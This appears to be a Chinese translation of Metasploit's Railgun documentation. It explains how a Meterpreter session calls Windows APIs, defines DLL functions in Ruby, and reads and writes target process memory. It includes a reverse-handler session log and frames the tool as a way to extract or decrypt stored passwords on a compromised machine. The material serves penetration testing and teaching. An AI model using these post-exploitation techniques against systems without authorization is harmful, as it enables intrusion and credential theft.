RailGunner是Windows Meterpreter独有的强大的后期开发功能。它可以让你完全控制你的目标机器的Windows API，或者你可以使用你找到的任何DLL，并用它做更多的创意性的工作。例如：假设您在Windows目标上有一个meterpreter会话。你有一个特定的应用程序，你认为存储用户的密码，但它是加密的，但是没有工具在那里解密。使用RailGun，你可以做的是，你可以进入这个进程，并查找内存中发现的任何敏感信息，或者你可以查找负责解密的程序的DLL，调用它，并让它为你解密。如果你是渗透测试人员，显然后期开发是一项重要的技能，但如果你不知道railgun,你错过很多，

### 定义一个DLL及其函数
Windows API显然是相当多的，所以默认情况下，Railgun只有一些预定义的DLL和通常用于构建Windows程序的函数。这些内置DLL是：kernel32, ntdll, user32, ws2_32, iphlpapi, advapi32, shell32, netapi32, crypt32, wlanapi, wldap32, version.内置DLL的相同列表也可以通过使用该`known_dll_names`方法来检索。

所有all定义可以在这个"[def](https://github.com/rapid7/metasploit-framework/tree/master/lib/rex/post/meterpreter/extensions/stdapi/railgun/def)" 目录找到.他们是像一个类一样定义的.下面的模块应该能演示一个dll是怎么定义的

```ruby
# -*- coding: binary -*-
module Rex
module Post
module Meterpreter
module Extensions
module Stdapi
module Railgun
module Def

class Def_somedll

  def self.create_dll(dll_path = 'somedll')
    dll = DLL.new(dll_path, ApiConstants.manager)

    # 1st argument = Name of the function
    # 2nd argument = Return value's data type
    # 3rd argument = An array of parameters
    dll.add_function('SomeFunction', 'DWORD',[
      ["DWORD","hwnd","in"]
    ])

    return dll
  end

end

end; end; end; end; end; end; end
```
在函数定义,railgun支持这些数据类型:VOID, BOOL, DWORD, WORD, BYTE, LPVOID, HANDLE, PDWORD, PWCHAR, PCHAR, PBLOB.
有四个参数/缓冲区说明:in, out, inout, and return.将值传递给“in”参数时，Railgun将处理内存管理。例如，MessageBoxA有一个名为“in”的参数lpText，并且是PCHAR类型。你可以简单地传递一个Ruby字符串，然后Railgun处理剩下的事情，这非常简单。
“out”参数将始终是指针数据类型。基本上，你告诉Railgun要为参数分配多少字节，它分配内存，在调用函数时提供一个指向它的指针，然后读取该函数写入的内存区域，将其转换为Ruby对象，并将其添加到返回字典。
一个“inout”参数作为被调用函数的输入，但是可能会被其修改。您可以检查修改后的值的返回散列，如“out”参数。
在运行时定义一个新函数的快速方法,可以像下面的例子那样完成：

```ruby
client.railgun.add_function('user32', 'MessageBoxA', 'DWORD',[
	["DWORD","hWnd","in"],
	["PCHAR","lpText","in"],
	["PCHAR","lpCaption","in"],
	["DWORD","uType","in"]
 ])
```
但是，如果这个函数很可能被多次使用，或者它是Windows API的一部分，那么你应该把它放在库中。

### 示例
尝试Railgun的最好方法是在Windows Meterpreter提示符下使用irb。这是一个如何到达的例子：

```
$ msfconsole -q
msf > use exploit/multi/handler 
msf exploit(handler) > run

[*] Started reverse handler on 192.168.1.64:4444 
[*] Starting the payload handler...
[*] Sending stage (769536 bytes) to 192.168.1.106
[*] Meterpreter session 1 opened (192.168.1.64:4444 -> 192.168.1.106:55148) at 2014-07-30 19:49:35 -0500

meterpreter > irb
[*] Starting IRB shell
[*] The 'client' variable holds the meterpreter client

>>
```

注意,当你运行一个post模块或irb时，你总是有一个`client`或者一个`session`对象来处理，都指向相同的东西，在这种情况下是```Msf::Sessions::Meterpreter_x86_Win```.这个Meterpreter会话对象为您提供对目标机器的API访问，包括Railgun对象```Rex::Post::Meterpreter::Extensions::Stdapi::Railgun::Railgun```.这是你是如何简单的访问它

```ruby
session.railgun
```
如果你用irb运行上面的代码，你会发现它返回所有的DLL，函数，常量等的信息.它读取是有些不友好,因为那数据非常多.幸运的是，有一些方便的技巧可以帮助我们解决问题。例如，就像我们之前提到的那样，如果您不确定哪些DLL被加载，您可以调用`known_dll_names`方法：


```
>> session.railgun.known_dll_names
=> ["kernel32", "ntdll", "user32", "ws2_32", "iphlpapi", "advapi32", "shell32", "netapi32", "crypt32", "wlanapi", "wldap32", "version"]
```

现在，假设我们对user32感兴趣，并且希望找到所有可用的函数（以及返回值的数据类型，参数），另一个方便的技巧是：

```ruby
session.railgun.user32.functions.each_pair {|n, v| puts "Function name: #{n}, Returns: #{v.return_type}, Params: #{v.params}"}
```

请注意，如果您碰巧调用了无效的或不受支持的Windows函数，会引发一个`runtimeerror`和错误信息.并显示可用函数的列表。
要调用Windows API函数，请执行以下操作：

```
>> session.railgun.user32.MessageBoxA(0, "hello, world", "hello", "MB_OK")
=> {"GetLastError"=>0, "ErrorMessage"=>"The operation completed successfully.", "return"=>1}
```
如果你能看到api调用返回一个字典.我们已经看到了一个习惯，有时人们不喜欢检查```GetLastError```, ```ErrorMessage```, 和```return``` 值.他们只是假设它是工作的。这是一个坏的程序习惯,是不推荐的.如果你也假设一些东西是工作的,和执行下一个api调用.你有可能获得意外的结果（最坏的情况：丢失Meterpreter会话）。

### 内存读写
这个Railgun类还有两个非常有用的方法，您可能会使用：memread和memwrite。名字是不言自明的：你读了一块内存，或者你写入一个内存区域。我们将在有效载荷本身中演示 一个新的内存块：

```
>> p = session.sys.process.open(session.sys.process.getpid, PROCESS_ALL_ACCESS)
=> #<#<Class:0x007fe2e051b740>:0x007fe2c5a258a0 @client=#<Session:meterpreter 192.168.1.106:55151 (192.168.1.106) "WIN-6NH0Q8CJQVM\sinn3r @ WIN-6NH0Q8CJQVM">, @handle=448, @channel=nil, @pid=2268, @aliases={"image"=>#<Rex::Post::Meterpreter::Extensions::Stdapi::Sys::ProcessSubsystem::Image:0x007fe2c5a25828 @process=#<#<Class:0x007fe2e051b740>:0x007fe2c5a258a0 ...>>, "io"=>#<Rex::Post::Meterpreter::Extensions::Stdapi::Sys::ProcessSubsystem::IO:0x007fe2c5a257b0 @process=#<#<Class:0x007fe2e051b740>:0x007fe2c5a258a0 ...>>, "memory"=>#<Rex::Post::Meterpreter::Extensions::Stdapi::Sys::ProcessSubsystem::Memory:0x007fe2c5a25738 @process=#<#<Class:0x007fe2e051b740>:0x007fe2c5a258a0 ...>>, "thread"=>#<Rex::Post::Meterpreter::Extensions::Stdapi::Sys::ProcessSubsystem::Thread:0x007fe2c5a256c0 @process=#<#<Class:0x007fe2e051b740>:0x007fe2c5a258a0 ...>>}>
>> p.memory.allocate(1024)
=> 5898240
```
像你能看到的 新的分配在地址5898240(或者16进制 0x005A0000).让我们首先在上面写4个字节


```
>> session.railgun.memwrite(5898240, "AAAA", 4)
=> true
```

```memwrite```返回true,这种情况意味这成功,让我们从0x005A0000读取4个字节

```
>> session.railgun.memread(5898240, 4)
=> "AAAA"
```

请注意，如果提供的指针不正确，则可能导致访问冲突并使Meterpreter发生崩溃。

### 参考

https://www.youtube.com/watch?v=AniR-T0AnnI

https://www.defcon.org/images/defcon-20/dc-20-presentations/Maloney/DEFCON-20-Maloney-Railgun.pdf

https://dev.metasploit.com/redmine/projects/framework/wiki/RailgunUsage

https://github.com/rapid7/metasploit-framework/tree/master/lib/rex/post/meterpreter/extensions/stdapi/railgun

http://msdn.microsoft.com/en-us/library/ms681381(VS.85).aspx

http://msdn.microsoft.com/en-us/library/aa383749

http://undocumented.ntinternals.net/

http://source.winehq.org/WineAPI/